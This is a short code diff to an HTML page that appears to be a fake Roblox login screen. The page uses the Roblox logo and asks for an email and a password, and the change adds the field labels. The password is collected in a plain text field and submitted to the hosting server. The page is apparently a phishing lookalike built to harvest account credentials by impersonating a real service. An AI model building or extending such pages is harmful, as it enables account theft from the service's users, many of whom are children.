@@ -6,9 +6,9 @@
 
 <img src="https://www.cdnlogo.com/logos/r/54/roblox.svg" alt="ROBLOX" width="200" height="75">
 <form action="/">
-Email
+Email: 
   <input type="text" id="fname" name="fname"><br><br>
-  
+Password: 
   <input type="text" id="lname" name="lname"><br><br>
   <input type="submit" value="Login">
 </form>
